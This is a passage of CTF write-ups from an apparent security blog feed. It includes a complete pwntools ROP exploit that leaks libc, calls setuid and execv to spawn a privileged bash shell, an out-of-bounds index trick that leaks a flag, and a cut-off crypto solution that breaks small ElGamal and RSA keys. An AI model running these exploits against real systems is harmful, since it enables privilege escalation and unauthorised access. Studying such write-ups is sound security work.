<p>Now we ran into another problem, <strong>system</strong> will drop privileges we need to use an alternative <strong>exec</strong> is perfect for this, but we can’t just do <strong>execv(‘/bin/bash’,0x0)</strong> if we read the man documentation of <strong>/bin/bash</strong> :<br><a data-fancybox="gallery" href="https://i.imgur.com/yn29jpS.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/yn29jpS.png" alt=""><br></a></p>
<p>The explanation from man pages is very clear, we need to provide <strong>-p</strong> as an argument to <strong>/bin/bash</strong>, we could do it with a <strong>ROPCHAIN</strong> but is harder to to find the right <strong>gadgets</strong> to put more than 1 arguments, since we have local access to the server we can just write a file into <strong>/tmp/exp</strong> and then execute it with <strong>execv(“/tmp/exp”,0x0)</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/bin/bash -p</span></div><div class="line">/bin/bash -p</div></pre></td></tr></table></figure>
<p>I had some problems to use <strong>vim</strong> and <strong>nano</strong> (python interactive shell didn’t work very well with them), so I had to write to script in my machine and convert it into <strong>base64</strong>, then using <strong>echo</strong> I wrote the file and decoded it into <strong>/tmp/exp</strong>:</p>
<p>My machine</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ cat shell </div><div class="line"><span class="comment">#!/bin/bash -p</span></div><div class="line">/bin/bash -p</div><div class="line">$ cat shell | base64</div><div class="line">IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg==</div></pre></td></tr></table></figure>
<p>Server’s machine</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg=='</span> | base64 -d</div><div class="line"><span class="comment">#!/bin/bash -p</span></div><div class="line">/bin/bash -p</div><div class="line">$ <span class="built_in">echo</span> <span class="string">'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg=='</span> | base64 -d &gt; /tmp/exp</div><div class="line">$ chmod +x /tmp/exp</div></pre></td></tr></table></figure>
<p>Now we just need to build a <strong>ropchain</strong> that runs <strong>execv(‘/tmp/exp’, 0x0)</strong> we can’t use something like we use to system we need the address where <strong>/tmp/exp</strong> is stored, the trick here is to put this string on the stack and get it’s address from the register <strong>RSP</strong>, we need to find a gadget like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MOV RDI, RSP </div><div class="line">CALL RAX</div></pre></td></tr></table></figure>
<p>First we need to store the address from <strong>execv</strong> into <strong>RAX</strong>, and we need to put the string <strong>/tmp/exp</strong> into the stack, so when we <strong>MOV RDI, RSP</strong>,  we are going to move the address of the the string  into <strong>RDI</strong> and then <strong>CALL RAX</strong>. These special gadget is not found in <strong>./wrong</strong> binary we actually needed to search it in the libc binary itself! you can use RopGadgets to do it:</p>
<p>We can build an ropchain that does that like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">MOVCALL_OFFSET = <span class="number">0x12b845</span></div><div class="line">POPRET_OFFSET = <span class="number">0x33544</span></div><div class="line"></div><div class="line">ropchain += p64(LIBCBASE + POPRET_OFFSET) <span class="comment"># POP RAX; RET</span></div><div class="line">ropchain += p64(EXECV) <span class="comment"># "exec"</span></div><div class="line">ropchain += p64(LIBCBASE + MOVCALL_OFFSET) <span class="comment"># MOV RDI, RSP; CALL RAX</span></div><div class="line">ropchain += <span class="string">"/tmp/exp\x00"</span></div></pre></td></tr></table></figure></p>
<p>The full exploit is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./wrong'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'10.133.70.1'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"></div><div class="line"> </div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc.so.6 | grep '/bin/sh'</span></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./wrong'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PADDING = <span class="string">'A'</span>*<span class="number">40</span></div><div class="line">POPRET = <span class="number">0x4007f3</span></div><div class="line">POPRET2 = <span class="number">0x4007f1</span></div><div class="line">POPRET3 = <span class="number">0x00000000004007f1</span></div><div class="line"></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>] <span class="comment">#0x000000000040056c</span></div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x4006e6</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"><span class="keyword">print</span> r.recv(len(<span class="string">'Nice to meet you '</span>)+len(PADDING)+<span class="number">3</span>)</div><div class="line"></div><div class="line">PUTS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"></div><div class="line">LIBCBASE = PUTS-libc.symbols[<span class="string">'puts'</span>]</div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">EXECV = LIBCBASE + libc.symbols[<span class="string">'execv'</span>]</div><div class="line">SETUID = LIBCBASE + libc.symbols[<span class="string">'setuid'</span>]</div><div class="line">log.info(<span class="string">"LEAKED PUTS LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"EXECV LIBC 0x%x"</span> % EXECV)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div><div class="line">log.info(<span class="string">"SETUID ADDRESS 0x%x"</span> % SETUID)</div><div class="line"></div><div class="line">MOVCALL_OFFSET = <span class="number">0x12b845</span></div><div class="line">POPRET_OFFSET = <span class="number">0x33544</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line"></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI RET</span></div><div class="line">ropchain += p64(<span class="number">1337</span>) <span class="comment"># 1337 ARG[1]</span></div><div class="line">ropchain += p64(SETUID) <span class="comment"># SETUID function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(LIBCBASE + POPRET_OFFSET) <span class="comment"># POP RAX; RET</span></div><div class="line">ropchain += p64(EXECV) <span class="comment"># "exec"</span></div><div class="line">ropchain += p64(LIBCBASE + MOVCALL_OFFSET) <span class="comment"># MOV RDI RSP; CALL RAX</span></div><div class="line">ropchain += <span class="string">"/tmp/exp\x00"</span> </div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># SYSTEM function "call"</span></div><div class="line"></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>Now if we run it we can see we got the <strong>euid</strong> from molly and because of that we can read the <strong>flag.txt</strong> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$id</span></div><div class="line">uid=1001(wrong-user) gid=1001(wrong-user) euid=1337(molly) groups=1001(wrong-user)</div><div class="line">$ ls /home/molly/flag.txt</div><div class="line">/home/molly/flag.txt</div><div class="line">$ cat /home/molly/flag.txt</div><div class="line">CTF-BR&#123;!!two_steps_pwnage!!&#125;</div></pre></td></tr></table></figure>
<p>I want to thank the organizers of this CTF for letting me getting access to the VPN to finish this challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Wrong User&lt;br&gt;&lt;br&gt;Molly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that yo
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win - Hidden Program (Warmup)</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/</id>
    <published>2017-10-22T20:42:32.000Z</published>
    <updated>2017-10-22T20:44:33.929Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Hidden Program (Warmup)<br><br>Molly found this program hidden on her chip, can you help her to understand it?<br><br>Link:<br><a href="https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz" target="_blank" rel="external">https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz</a><br><br>Mirror:<br><a href="https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz" target="_blank" rel="external">https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz</a><br><br>Server: nc 200.136.213.126 1988<br><br>Id: hidden_program<br><br>Total solves: 145<br><br>Score: 82<br><br>Categories: Exploitation<br></blockquote>

<p>After extracting we have a .c file:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;limits.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line"></div><div class="line">typedef struct</div><div class="line">&#123;</div><div class="line">    char flag[SHRT_MAX+<span class="number">1</span>];</div><div class="line">    char <span class="keyword">in</span>[SHRT_MAX+<span class="number">1</span>];</div><div class="line">    char sub[SHRT_MAX+<span class="number">1</span>];</div><div class="line">    int n;</div><div class="line">&#125; player;</div><div class="line"></div><div class="line">player p1;</div><div class="line"></div><div class="line">void main()</div><div class="line">&#123;    </div><div class="line">    FILE *fp = fopen(<span class="string">"/home/user/ctf/flag"</span>,<span class="string">"r"</span>);</div><div class="line">    memset(p1.flag,<span class="number">0</span>,sizeof(p1.flag));</div><div class="line">    fscanf(fp,<span class="string">"%[^\n]"</span>,p1.flag);</div><div class="line">    fclose(fp);</div><div class="line">    printf(<span class="string">"%s\n"</span>, p1.<span class="keyword">in</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        printf(<span class="string">"Insert a short integer: "</span>);</div><div class="line">        fflush(stdout);</div><div class="line">        scanf(<span class="string">" %d"</span>, &amp;p1.n);</div><div class="line">        <span class="keyword">if</span>(p1.n&gt;SHRT_MAX)</div><div class="line">            printf(<span class="string">"Invalid number\n\n"</span>);</div><div class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    p1.n = (short)abs((short)p1.n);</div><div class="line">    printf(<span class="string">"Insert a string: "</span>);</div><div class="line">    fflush(stdout);</div><div class="line">    scanf(<span class="string">"%10000s"</span>,p1.<span class="keyword">in</span>);</div><div class="line">    printf(<span class="string">"Insert another string: "</span>);</div><div class="line">    fflush(stdout);</div><div class="line">    scanf(<span class="string">"%10000s"</span>,p1.sub);</div><div class="line">    <span class="keyword">if</span>(strcmp(&amp;p1.<span class="keyword">in</span>[p1.n],p1.sub)==<span class="number">0</span>) printf(<span class="string">"Congratulations!! YOU WIN!!\n"</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        printf(<span class="string">"\tYou lost!!!\n\</span></div><div class="line"><span class="string">        In the string %s the substring in the position %d is %s\n\</span></div><div class="line"><span class="string">        Try again...\n"</span>, p1.<span class="keyword">in</span>, p1.n, &amp;p1.<span class="keyword">in</span>[p1.n]);</div><div class="line">    fflush(stdout);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Resuming what this program is doing, first it opens the flag file from the server and stores it in the c <strong>struct</strong> field <strong>p1.flag</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FILE *fp = fopen(<span class="string">"/home/user/ctf/flag"</span>,<span class="string">"r"</span>);</div><div class="line"><span class="built_in">memset</span>(p1.flag,<span class="number">0</span>,<span class="keyword">sizeof</span>(p1.flag));</div><div class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%[^\n]"</span>,p1.flag);</div><div class="line">fclose(fp);</div></pre></td></tr></table></figure></p>
<p>Then reads from the <strong>stdin</strong> using <strong>scanf</strong> for a <strong>short int</strong> (stores it in <strong>p1.n</strong>= and two <strong>strings</strong> (stores them in <strong>p1.in</strong> and <strong>p1.sub</strong>). </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Insert a short integer: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">" %d"</span>, &amp;p1.n);</div><div class="line">  <span class="keyword">if</span>(p1.n&gt;SHRT_MAX)</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Invalid number\n\n"</span>);</div><div class="line">  <span class="keyword">else</span> <span class="keyword">break</span>;</div><div class="line">  &#125;</div><div class="line">p1.n = (<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)p1.n);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Insert a string: "</span>);</div><div class="line">fflush(<span class="built_in">stdout</span>);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%10000s"</span>,p1.in);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Insert another string: "</span>);</div><div class="line">fflush(<span class="built_in">stdout</span>);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%10000s"</span>,p1.sub);</div></pre></td></tr></table></figure>
<p>In the end we have this check:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(&amp;p1.in[p1.n],p1.sub)==<span class="number">0</span>) </div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Congratulations!! YOU WIN!!\n"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\tYou lost!!!\n\</span></div><div class="line"><span class="string">  In the string %s the substring in the position %d is %s\n\</span></div><div class="line"><span class="string">  Try again...\n"</span>, p1.in, p1.n, &amp;p1.in[p1.n]);</div></pre></td></tr></table></figure>
<p>Well the <strong>strcmp</strong> does a compares between <strong>p1.n[p1.n]</strong> character and the string <strong>p1.sub</strong>, if they are equal it prints out the string “Congratulations!! YOU WIN!!\n”, well we can see that making <strong>strcmp</strong> matching this will lead to nothing just a useless string, what we are interested what comes after <strong>else</strong>…</p>
<p>Since we can control the <strong>index</strong> with <strong>p1.n</strong>, we can actually make this <strong>printf</strong> to print the flag which is <strong>p1.flag</strong> we just need to get the offset between <strong>p1.in</strong> and <strong>p1.flag</strong> we can get this easily with <strong>gdb</strong>:</p>
<p>First lets compile the file with <strong>gcc</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ gcc hiddenprogram.c -ggdb -o lol </div><div class="line">hiddenprogram.c: In <span class="keyword">function</span> ‘main’:</div><div class="line">hiddenprogram.c:31:19: warning: implicit declaration of <span class="keyword">function</span> ‘abs’ [-Wimplicit-function-declaration]</div><div class="line">     p1.n = (short)abs((short)p1.n);</div></pre></td></tr></table></figure>
<p>The <strong>–gdb</strong> is very useful gives us alot of debugging information with gdb, we can view where we are located in the source code, breakpoints indicating the line numbers and even print variables by just using its names much easier than looking at assembly and print using addresses right?<br><a data-fancybox="gallery" href="https://i.imgur.com/jNPOgcG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jNPOgcG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/dJky7GF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/dJky7GF.png" alt=""><br></a></p>
<p>After using <strong>gdb</strong> we know where each variable from the <strong>struct</strong> begins doing a simple subtraction we can get the <strong>offset</strong> we need to print the <strong>flag</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x5555557550a0-0x55555575d0a0"</span></div><div class="line"><span class="number">-32768</span></div></pre></td></tr></table></figure>
<p>The real problem in all this is that we need a negative value, and there is a ABS function making us fail:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p1.n = (<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)p1.n);</div></pre></td></tr></table></figure>
<p>For some reason actually after the negative number when &gt;= -32768 the abs won’t do anything (I don’t really know why maybe its because the short cast? but if you know why this happens please tweet me or make a post in the comments)! this is perfect that’s what we really needed, you can see how the <strong>abs</strong> is doing with this program:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">   <span class="keyword">int</span> below=(<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)<span class="number">-32767</span>);</div><div class="line">   <span class="keyword">int</span> value_we_need=(<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)<span class="number">-32768</span>);</div><div class="line">   <span class="keyword">int</span> higher=(<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)<span class="number">-32769</span>);</div><div class="line">   <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, below,value_we_need,higher);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gcc wtf.c -o wtf</div><div class="line">wtf.c: In <span class="keyword">function</span> ‘main’:</div><div class="line">wtf.c:4:21: warning: implicit declaration of <span class="keyword">function</span> ‘abs’ [-Wimplicit-function-declaration]</div><div class="line">    int below=(short)abs((short)-32767);</div><div class="line">                     ^~~</div><div class="line">$ ./wtf </div><div class="line">32767 -32768 32767</div></pre></td></tr></table></figure></p>
<p>Now applying this with the service we get the flag by injection <strong>-32768</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">nc 200.136.213.126 1988</div><div class="line">                                 </div><div class="line">Insert a short <span class="built_in">integer</span>: -32768</div><div class="line">Insert a string: 1</div><div class="line">1Insert another string: 1</div><div class="line">	You lost!!!</div><div class="line">        In the string 1 the substring <span class="keyword">in</span> the position -32768 is CTF-BR&#123;Th1s_1S_4_50_5Imp13_C_exp1017_&#125;</div><div class="line">        Try again...</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Hidden Program (Warmup)&lt;br&gt;&lt;br&gt;Molly found this program hidden on her chip, can you help her to understand it?&lt;br&gt;&lt;br&gt;Link:&lt;
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="index" scheme="https://teamrocketist.github.io/tags/index/"/>
    
      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-Pwn2Win-2017-Asymmetric-Encryption</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/</id>
    <published>2017-10-22T20:07:58.000Z</published>
    <updated>2017-10-22T21:11:31.702Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Asymmetric Encryption<br>Bloodsuckers use different asymmetric encryption algorithms to send messages to their partners. You may be able to exploit such communications, but first you should be able to recognize the used asymmetric algorithms.<br><br>Server: nc 200.136.213.110 7777<br><br></blockquote>

<p>We fire netcat and we obtain the following:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">q = 896922063827</div><div class="line">g = 12424931089</div><div class="line">h = 574559267769</div><div class="line">enc(a) = (453104394915, 390471080026)</div><div class="line">enc(3*a + 32)?</div></pre></td></tr></table></figure>
<p>We notice that the cryptosystem here must be ElGamal.<br>One can obtain the encryption of 3<em>a, because ElGamal is homomorphic in relation to the multiplication, i.e. E(m1)</em>E(m2) = E(m1*m2). But, it is not in relation to the addition. Therefore, it is required to find the private key x such that g^x mod q = h. As the prime q only has 40 bits, it is easy to find out with the baby step giant step meet in the middle attack.<br>We used <a href="https://github.com/viralpoetry/Baby-step-giant-step" target="_blank" rel="external">https://github.com/viralpoetry/Baby-step-giant-step</a> to compute the discrete log. We obtain x = 202922528794.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">202922528794</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q = <span class="number">896922063827</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>h = <span class="number">574559267769</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>g = <span class="number">12424931089</span></div><div class="line"><span class="comment"># we have now to find a</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>enc = (<span class="number">453104394915</span>, <span class="number">390471080026</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = pow(enc[<span class="number">0</span>], x, q)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sinv = modinv(s, q)</div><div class="line"><span class="comment"># (modinv from https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python)</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = enc[<span class="number">1</span>] * sinv % q</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line"><span class="number">108768066438L</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>to_encrypt = <span class="number">3</span>*a + <span class="number">32</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="number">5</span>   <span class="comment"># we chose a small random number for the encryption. it could be whatever you wanted &lt; q</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>result = (pow(g, r, q), to_encrypt * pow(h, r, q) % q)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>result</div><div class="line">(<span class="number">801172058328L</span>, <span class="number">410122112192L</span>)</div></pre></td></tr></table></figure>
<p>Easy. We have our first correct answer.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">q = 896922063827</div><div class="line">g = 12424931089</div><div class="line">h = 574559267769</div><div class="line">enc(a) = (453104394915, 390471080026)</div><div class="line">enc(3*a + 32)?</div><div class="line">(801172058328, 410122112192)</div><div class="line">Correct! Next...</div><div class="line">n = 659381354716006369742363</div><div class="line">e = 65537</div><div class="line">enc(a) = 554863447144015806910906</div><div class="line">enc(a^5 + 2*a + 41)?</div></pre></td></tr></table></figure>
<p>Now, this is clearly RSA. The modulus is small. Let’s use yafu to compute the factors of 659381354716006369742363.<br>We obtain p = 864367132729 and q = 762848712947. </p>
